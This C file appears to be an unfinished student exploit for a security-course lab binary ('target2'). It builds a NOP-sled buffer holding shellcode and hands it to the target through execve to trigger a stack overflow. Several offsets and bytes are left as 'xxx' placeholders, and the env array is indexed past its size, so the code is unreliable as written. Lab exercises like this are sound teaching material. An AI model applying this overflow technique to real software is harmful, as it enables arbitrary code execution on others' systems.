#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"

/*
int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	args[0] = TARGET;
	args[1] = "hi there";
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
*/

int
main ( int argc, char * argv[] )
{
    char* args[3];
    char* env[1];

    int i;
    char buf[271];

    args[0] = TARGET;

    // Instantiate with NOP's ('\x90')
    for (i = 0 ; i < 271; i++) {
        buf[i] = '\x90';
    }

    // Copy shellcode into buf
    for (i = 19; i < 64; i++) {
        buf[i] = shellcode[i-19];
    }

    buf[264] = '\x0b';

    buf[xxx] = '\xxx';
    buf[xxx] = '\xxx';
    buf[xxx] = '\xxx';

    args[1] = buf;
    args[2] = NULL;

    env[0] = &buf[xxx];
    env[1] = xxx;

    if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
